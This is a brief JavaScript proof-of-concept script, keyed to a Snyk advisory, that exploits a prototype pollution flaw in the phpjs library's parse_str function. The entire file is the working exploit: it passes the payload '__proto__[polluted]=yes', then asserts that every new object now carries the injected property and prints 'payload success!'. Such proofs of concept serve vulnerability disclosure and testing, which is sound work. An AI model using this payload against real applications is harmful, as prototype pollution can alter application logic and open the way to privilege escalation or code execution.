//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

var p = require('phpjs')
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
p.parse_str("__proto__[polluted]=yes",{});
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");